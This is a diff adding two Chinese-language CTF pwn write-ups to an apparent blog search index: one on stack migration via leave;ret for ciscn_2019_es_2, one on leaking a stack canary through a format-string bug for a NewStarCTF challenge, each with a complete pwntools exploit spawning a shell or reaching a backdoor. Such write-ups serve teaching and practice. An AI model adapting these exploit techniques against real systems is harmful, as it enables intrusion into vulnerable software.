@@ -4,6 +4,56 @@
   
   
   <entry>
+    <title></title>
+    <link href="/2023/10/11/ctf-pwn/stack_migration/"/>
+    <url>/2023/10/11/ctf-pwn/stack_migration/</url>
+    
+    <content type="html"><![CDATA[<h3 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h3><p><img src="/img/stack_migration/1.jpg"></p><p>溢出的长度不足以写rop链，劫持rbp到一个足够大的空间里去</p><p>首先通过调试查看ebp到可输入空间开头的距离</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gdb.attach(p, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <span class="hljs-comment"># 在python pwntools里下断点的方法（要放在开头），进去按一下c</span><br></code></pre></td></tr></table></figure><p><img src="/img/stack_migration/2.jpg"></p><p>程序输出的rbp为<code>0xffdb7098</code>，和图中aaaa的位置相差0x38，一会就要将ebp覆盖为ebp-0x38，从而开辟足够的空间来构造rop</p><p>然后<code>vul()</code>函数原本的返回地址被<code>&amp;(leave ret)</code>取代了这样在<code>vul()</code>执行结束时，相当于多执行一次leave ret</p><p>过程如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">1</span>. vul()原本的<span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x38</span>   <span class="hljs-built_in">ebp</span>-&gt;aaaa   <span class="hljs-built_in">esp</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span><br><span class="hljs-number">2</span>. vul()原本的<span class="hljs-keyword">ret</span><br><span class="hljs-built_in">eip</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span>  <span class="hljs-built_in">esp</span>-&gt;比返回地址再低<span class="hljs-number">4</span>个字节的位置上<br><span class="hljs-number">3</span>. <span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;aaaa    <span class="hljs-built_in">ebp</span> == aaaa  <span class="hljs-built_in">esp</span>-&gt;system@plt<br><span class="hljs-number">4</span>. <span class="hljs-keyword">ret</span> <br><span class="hljs-built_in">eip</span>-&gt;system@plt   <span class="hljs-built_in">esp</span>-&gt;system的返回地址（瞎写的）<br></code></pre></td></tr></table></figure><p>这时，就相当于一个普通的rop了，system@plt为一个被溢出的返回地址，在他后面的是system的返回地址和它的参数，而”/bin/sh\x00”为一个字符串，需要一个指针指向它，因此需要计算一下binsh的地址。</p><p>由于aaaa是ebp-0x38，binsh距离aaaa有16个字节，那么这个地方填上ebp-0x28，就能给system传进去binsh的参数了。</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./ciscn_2019_es_2&quot;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25391)</span><br>gdb.attach(r, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <br>sys=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br>main=<span class="hljs-number">0xdeadbeef</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">&#x27;b&#x27;</span><br>r.send(payload)<br>r.recvuntil(<span class="hljs-string">&quot;b&quot;</span>)<br>rbp = u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rbp))<br><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+<span class="hljs-string">b&quot;????&quot;</span>+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;????&quot;</span>+p32(leave_ret)<br><br>r.send(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf-pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>canary</title>
+    <link href="/2023/10/11/ctf-pwn/canary/"/>
+    <url>/2023/10/11/ctf-pwn/canary/</url>
+    
+    <content type="html"><![CDATA[<h3 id="canary泄露"><a href="#canary泄露" class="headerlink" title="canary泄露"></a>canary泄露</h3><p>NewStarCTF 2023 canary：</p><p><img src="/img/canary/1.jpg"></p><p><code>__readfsqword(0x28u)</code>说明添加了canary，但是第一次输入只能输入32字节，距离把canary一块printf出来差了8字节，因此用格式化字符串漏洞把canary打印出来。</p><p><code>printf</code>的参数中，rdi为第一次输入的格式化字符串，然后需要5个%p把rsi，rdx，rcx，r8，r9略过，然后再来6个%p（因为后面的参数在栈上，而canary是栈上第41-48字节，需要第六个%p才能将其打印出来）</p><p>然后第二次输入就是一个最简单的rop链了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./canary&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28964</span>)<br>e = ELF(<span class="hljs-string">&quot;./canary&quot;</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>backdoor = e.sym[<span class="hljs-string">&quot;backdoor&quot;</span>]<br><br>payload = <span class="hljs-string">b&quot;%p%p%p%p%p%p%p%p%p%p%p&quot;</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;Give me some gift?\n&quot;</span>, payload)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Oh thanks,There is my gift:\n&quot;</span>)<br><br>leak = p.recvline()<br><br>canary = <span class="hljs-built_in">eval</span>(leak[-<span class="hljs-number">19</span>:-<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Show me your magic\n&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(backdoor)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf-pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>word隐写</title>
     <link href="/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/"/>
     <url>/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/</url>
